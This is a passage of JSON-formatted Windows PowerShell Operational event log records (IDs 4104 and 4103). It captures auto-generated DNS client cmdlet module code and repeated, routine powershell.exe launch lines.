[Parameter(ParameterSetName='Query (cdxml)')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Query (cdxml)')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [switch]\r\n    ${AsJob},\r\n\r\n    [Parameter(ParameterSetName='Query (cdxml)')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [switch]\r\n    ${PassThru})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT/StandardCimv2/MSFT_DNSClientDohServerAddress'\r\n$script:ClassVersion = '1.0.0'\r\n$script:ModuleVersion = '1.0.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Add-DnsClientDohServerAddress\r\n{\r\n    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true, Position=0, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]\r\n    [string]\r\n    ${ServerAddress},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0', Position=1, ValueFromPipelineByPropertyName=$true)]\r\n    [string]\r\n    ${DohTemplate},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0', Position=2, ValueFromPipelineByPropertyName=$true)]\r\n    [bool]\r\n    ${AllowFallbackToUdp},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0', Position=3, ValueFromPipelineByPropertyName=$true)]\r\n    [bool]\r\n    ${AutoUpgrade},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='cim:CreateInstance0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ServerAddress')) {\r\n          [object]$__cmdletization_value = ${ServerAddress}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServerAddress'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServerAddress'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DohTemplate')) {\r\n          [object]$__cmdletization_value = ${DohTemplate}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DohTemplate'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DohTemplate'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowFallbackToUdp')) {\r\n          [object]$__cmdletization_value = ${AllowFallbackToUdp}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowFallbackToUdp'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowFallbackToUdp'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AutoUpgrade')) {\r\n          [object]$__cmdletization_value = ${AutoUpgrade}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AutoUpgrade'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AutoUpgrade'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.UInt32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:CreateInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_DnsClientDohServerAddress.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Add-DnsClientDohServerAddress' -Alias '*'\r\n        \r\n\r\nfunction Get-DnsClientDohServerAddress\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='Query (cdxml)', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/StandardCimv2/MSFT_DNSClientDohServerAddress')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Query (cdxml)', Position=0, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${ServerAddress},\r\n\r\n    [Parameter(ParameterSetName='Query (cdxml)')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Query (cdxml)')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Query (cdxml)')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('ServerAddress') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${ServerAddress})\r\n        $__cmdletization_queryBuilder.FilterByProperty('ServerAddress', $__cmdletization_values, $false, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT/StandardCimv2/MSFT_DNSClientServerAddress'\r\n$script:ClassVersion = '1.0.0'\r\n$script:ModuleVersion = '1.0.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Get-DnsClientServerAddress\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='ByName', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/StandardCimv2/MSFT_DNSClientServerAddress')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='ByName', ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [uint32[]]\r\n    ${InterfaceIndex},\r\n\r\n    [Parameter(ParameterSetName='ByName', Position=0)]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${InterfaceAlias},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Alias('Family')]\r\n    [ValidateNotNull()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.DnsClientServerAddress.AddressFamily[]]\r\n    ${AddressFamily},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('InterfaceIndex') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${InterfaceIndex})\r\n        $__cmdletization_queryBuilder.FilterByProperty('InterfaceIndex', $__cmdletization_values, $false, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('InterfaceAlias') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${InterfaceAlias})\r\n        $__cmdletization_queryBuilder.FilterByProperty('InterfaceAlias', $__cmdletization_values, $true, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('AddressFamily') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${AddressFamily})\r\n        $__cmdletization_queryBuilder.FilterByProperty('AddressFamily', $__cmdletization_values, $false, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_DnsClientServerAddress.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-DnsClientServerAddress' -Alias '*'\r\n        \r\n\r\nfunction Set-DnsClientServerAddress\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='ByAlias', SupportsShouldProcess=$true, ConfirmImpact='Low', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/StandardCimv2/MSFT_DNSClientServerAddress')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='ByName', Mandatory=$true, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [uint32[]]\r\n    ${InterfaceIndex},\r\n\r\n    [Parameter(ParameterSetName='ByAlias', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${InterfaceAlias},\r\n\r\n    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_DNSClientServerAddress')]\r\n    [ValidateNotNull()]\r\n    [ciminstance[]]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Parameter(ParameterSetName='ByAlias')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [Alias('Addresses')]\r\n    [string[]]\r\n    ${ServerAddresses},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Parameter(ParameterSetName='ByAlias')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [switch]\r\n    ${Validate},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Parameter(ParameterSetName='ByAlias')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [Alias('ResetAddresses')]\r\n    [switch]\r\n    ${ResetServerAddresses},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Parameter(ParameterSetName='ByAlias')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Parameter(ParameterSetName='ByAlias')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Parameter(ParameterSetName='ByAlias')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [switch]\r\n    ${AsJob},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Parameter(ParameterSetName='ByAlias')]\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [switch]\r\n    ${PassThru})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('InterfaceIndex') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${InterfaceIndex})\r\n        $__cmdletization_queryBuilder.FilterByProperty('InterfaceIndex', $__cmdletization_values, $false, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('InterfaceAlias') -and (@('ByAlias') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${InterfaceAlias})\r\n        $__cmdletization_queryBuilder.FilterByProperty('InterfaceAlias', $__cmdletization_values, $true, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n    switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('ByName', 'ByAlias', 'InputObject (cdxml)') -contains $_ } {\r\n          [object]$__cmdletization_defaultValue = $null\r\n          [object]$__cmdletization_defaultValueIsPresent = $false\r\n          if ($PSBoundParameters.ContainsKey('ServerAddresses')) {\r\n            [object]$__cmdletization_value = ${ServerAddresses}\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:ServerAddresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n          } else {\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:ServerAddresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n          }\r\n          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n          [object]$__cmdletization_defaultValue = $null\r\n          [object]$__cmdletization_defaultValueIsPresent = $false\r\n          if ($PSBoundParameters.ContainsKey('Validate')) {\r\n            [object]$__cmdletization_value = ${Validate}\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Validate'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n          } else {\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Validate'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n          }\r\n          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n          [object]$__cmdletization_defaultValue = $null\r\n          [object]$__cmdletization_defaultValueIsPresent = $false\r\n          if ($PSBoundParameters.ContainsKey('ResetServerAddresses')) {\r\n            [object]$__cmdletization_value = ${ResetServerAddresses}\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:ResetServerAddresses'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n          } else {\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:ResetServerAddresses'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n          }\r\n          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = $null\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru\r\n            if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }\r\n            } else {\r\n                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)\r\n            }\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_DnsClientServerAddress.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Set-DnsClientServerAddress' -Alias '*'"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
